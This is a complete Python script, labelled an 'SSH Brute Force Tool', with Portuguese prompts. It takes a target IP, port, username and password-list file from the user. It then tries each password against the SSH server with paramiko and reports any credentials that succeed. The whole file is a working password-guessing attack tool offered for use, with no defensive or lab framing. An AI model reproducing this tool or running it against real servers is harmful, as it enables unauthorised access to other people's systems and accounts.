import paramiko
import sys

def display_banner():
    print("=" * 50)
    print("      SSH Brute Force Tool")
    print("          Criado por Sven")
    print("=" * 50)

def ssh_brute_force(host, port, user, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 

    with open(password_list, "r") as passwords:
        for password in passwords:
            password = password.strip()
            try:
                print(f"[*] Tentando senha: {password}")
                client.connect(hostname=host, port=port, username=user, password=password, timeout=3)
                print(f"[+] Sucesso! Credenciais encontradas: {user}:{password}")
                client.close()
                return
            except paramiko.AuthenticationException:
                print(f"[-] Falha: {password}")
            except Exception as e:
                print(f"[!] Erro de conexão: {e}")
                break
        print("[*] Tentativas finalizadas. Senha não encontrada.")
    client.close()

if __name__ == "__main__":
    display_banner()  
    host = input("IP do servidor: ")
    port = int(input("Porta SSH (padrão 22): ") or 22)
    user = input("Nome de usuário: ")
    password_list = input("Arquivo de lista de senhas: ")

    ssh_brute_force(host, port, user, password_list)

                      
                 


